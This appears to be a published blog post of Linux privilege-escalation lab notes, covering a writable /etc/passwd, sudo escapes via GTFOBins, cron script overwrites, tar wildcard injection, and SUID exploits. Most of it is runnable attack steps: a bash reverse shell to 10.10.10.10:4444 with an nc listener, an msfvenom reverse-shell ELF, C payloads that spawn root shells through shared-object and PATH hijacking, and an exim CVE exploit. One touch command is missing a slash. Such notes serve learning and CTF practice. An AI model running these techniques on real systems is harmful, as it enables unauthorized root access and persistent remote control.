---
title: 'Linux Privilege Escalation Notes: Permissions, Sudo Escapes, Cron Abuses,
  and SUID Tricks'
summary: 'A field-ready set of Linux local privilege escalation techniques: writable
  /etc/passwd, sudo shell escapes via GTFOBins, cron misconfigurations (writable scripts
  and wildcard injection), and SUID/SGID exploitation patterns including known CVEs,
  shared object injection, and PATH/environment hijacking.'
tags:
- linux
- privesc
- suid
- sgid
- sudo
- cron
- gtfobins
- file-permissions
- path-hijack
- shared-object
- reverse-shell
- ctf
published: true
date: '2025-12-31'
slug: linux-privesc-permissions-sudo-cron-suid
---

# Linux Privilege Escalation Notes: Permissions, Sudo Escapes, Cron Abuses, and SUID Tricks

## Table of Contents

- [Weak File Permissions - Writable /etc/passwd](https://supusuge.com/p/linux-privesc-permissions-sudo-cron-suid/#weak-file-permissions---writable-etcpasswd)
- [Sudo - Shell escape sequences](https://supusuge.com/p/linux-privesc-permissions-sudo-cron-suid/#sudo---shell-escape-sequences)
- [Cron jobs (File Permissions)](https://supusuge.com/p/linux-privesc-permissions-sudo-cron-suid/#cron-jobs-file-permissions)
- [Cron Job wild cards](https://supusuge.com/p/linux-privesc-permissions-sudo-cron-suid/#cron-job-wild-cards)
- [SUID/SGID executables - Known Exploits](https://supusuge.com/p/linux-privesc-permissions-sudo-cron-suid/#suidsgid-executables---known-exploits)
- [SUID/SGID executables - Shared Object Injection](https://supusuge.com/p/linux-privesc-permissions-sudo-cron-suid/#suidsgid-executables---shared-object-injection)
- [SUID/SGID executables - Environment Variables](https://supusuge.com/p/linux-privesc-permissions-sudo-cron-suid/#suidsgid-executables---environment-variables)

---

## Weak File Permissions - Writable /etc/passwd

The `/etc/passwd` file contains information about user accounts. It is **world-readable** by design, but it should be **writable only by root**.

Historically, `/etc/passwd` stored password hashes directly. Modern systems typically store hashes in `/etc/shadow` and keep an `x` placeholder in `/etc/passwd`. However, if `/etc/passwd` becomes writable, you can sometimes restore the old behavior and set a hash there.

Check permissions:

`ls -l /etc/passwd`

If you have write access, generate a new password hash (choose your own password):

`openssl passwd newpasswordhere`

Then edit `/etc/passwd` and place the generated password hash **between the first and second colon (`:`)** of the `root` row, replacing the `x`.

Example structure (do not copy blindly):

- Before:
  - `root:x:0:0:root:/root:/bin/bash`
- After:
  - `root:<hash>:0:0:root:/root:/bin/bash`

Switch to root using the new password:

`su root`

### Safer variant: create a new UID 0 user

Instead of modifying the real `root` entry, you can:

1. Copy the root line
2. Append it to the bottom of `/etc/passwd`
3. Change the first `root` username to something like `newroot`
4. Replace the `x` with your generated hash

Now authenticate as the new UID 0 user:

`su newroot`

---

## Sudo - Shell escape sequences

Start by enumerating allowed sudo commands:

`sudo -l`

Then cross-reference any allowed binaries with **GTFOBins**:

- https://gtfobins.github.io/

If a permitted program has a `sudo` technique listed, you can often escalate to a root shell.

Example using `find` (shell escape via `-exec`):

```find -> root
sudo find . -exec /bin/sh \; -quit
```

Notes:

- The idea is: if `sudo` allows running `find` as root without a password, you can use `find`’s ability to execute a command.
- Always verify exact sudo rule constraints (e.g., allowed arguments, `NOPASSWD`, secure_path).

---

## Cron jobs (File Permissions)

Cron is a common privilege escalation surface because:

- System cron jobs often run as root
- They run repeatedly
- Misconfigured file permissions can allow you to modify what root executes

View system cron configuration:

`cat /etc/crontab`

Look for:

- scripts/binaries executed by cron
- paths that are writable by your user (or your group)

If you find a root cron job executing a writable script (example name `overwrite.sh`), confirm permissions:

```
ls -l overwrite.sh

[script]
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

[from host machine]
nc -lvnp 4444
*Root Rev shell*
```

Operational flow:

1. Replace the cron-executed script with your payload
2. Start a listener on your machine (`nc -lvnp 4444`)
3. Wait for the cron schedule to trigger

Be mindful of:

- The cron environment is minimal (PATH may be limited)
- Use absolute paths if needed (`/bin/bash`, `/usr/bin/nc`, etc.)
- Cleanup after you get access to avoid repeated callbacks

---

## Cron Job wild cards

Wildcard usage in cron-executed scripts is another classic misconfiguration.

Inspect the cron script:

`cat /usr/local/bin/compress.sh`

If you see something like `tar` running against your home directory with a wildcard (`*`), it may be vulnerable. The key idea: **wildcards expand into filenames**, and `tar` accepts options that can be smuggled via crafted filenames.

Reference:

- GTFOBins `tar`: https://gtfobins.github.io/gtfobins/tar/

`tar` has checkpoint options that can execute commands:

- `--checkpoint=1`
- `--checkpoint-action=exec=<program>`

### One approach: reverse shell ELF via msfvenom

Generate a reverse shell ELF on your Kali box (update `LHOST` accordingly):

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.107.61 LPORT=4444 -f elf -o shell.elf `

Transfer the file to `/home/user` on the target (e.g., `scp` or a temporary webserver), then:

- `chmod +x /home/user/shell.elf`

Create the two special files in `/home/user`:

- `touch /home/user/--checkpoint=1`
- `touch /home/user--checkpoint-action=exec=shell.elf`

When the cron job runs something like `tar ... *`, the `*` expands to include these “filenames”. Because they begin with `--`, `tar` interprets them as **command-line options** rather than archive members.

Start a listener:

`nc -nvlp 4444`

After you catch the shell, exit the root shell and clean up so it doesn’t keep firing:

`rm /home/user/shell.elf   rm /home/user/--checkpoint=1   rm /home/user/--checkpoint-action=exec=shell.elf`

---

## SUID/SGID executables - Known Exploits

SUID/SGID binaries run with the privileges of their owner/group (often root). Misconfigured or vulnerable SUID binaries are high-impact.

Find SUID/SGID executables:

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

If you identify a versioned target with a known local exploit (example: `exim`), match the exact version to a CVE/PoC.

In this note’s lab context:

A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at **/home/user/tools/suid/exim/cve-2016-1531.sh**.

Run the exploit script to gain a root shell:

`/home/user/tools/suid/exim/cve-2016-1531.sh`

Practical reminders:

- “Exact version” matters: many local PoCs are brittle.
- Prefer offline verification (package version, build flags) before running.
- Always consider system stability: PoCs can crash services.

---

## SUID/SGID executables - Shared Object Injection

The **`/usr/local/bin/suid-so`** SUID executable is vulnerable to shared object injection.

First, execute it and note baseline behavior (in this case, a progress bar then exit):

`/usr/local/bin/suid-so`

Next, use `strace` to identify failed library loads or file accesses:

`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

If the binary tries to load a library from a user-controlled path, you may be able to drop a malicious `.so` and get code execution as root.

Create the directory it expects:

`mkdir /home/user/.config`

Example shared object code is located at **/home/user/tools/suid/libcalc.c**. It spawns a bash shell with preserved privileges. Compile it into a shared object at the exact path the executable looked for:

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

Re-run the SUID binary:

`/usr/local/bin/suid-so`

If successful, you’ll get a root shell.

Remember to exit the root shell before continuing.

`libcalc.c` (preserved verbatim):

```C

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```

---

## SUID/SGID executables - Environment Variables

The **`/usr/local/bin/suid-env`** executable can be exploited if it:

- inherits user environment variables (notably `PATH`)
- runs commands without absolute paths

Execute it and observe behavior (here, it appears to start Apache):

`/usr/local/bin/suid-env`

Inspect embedded strings:

`strings /usr/local/bin/suid-env`

If you see something like:

- `service apache2 start`

…and it does not call `/usr/sbin/service` with an absolute path, you can place a malicious `service` earlier in `PATH`.

Compile the provided payload located at `/home/user/tools/suid/service.c` into an executable named `service`:

`gcc -o service /home/user/tools/suid/service.c`

Prepend the current directory to `PATH`, then run the SUID program:

`PATH=.:$PATH /usr/local/bin/suid-env`

If successful, your fake `service` runs as root and spawns a privileged shell.

Remember to exit out of the root shell before continuing.

`service.c` (preserved verbatim):

```C
int main() {
	setuid(0);
	system("/bin/bash -p");
}
```
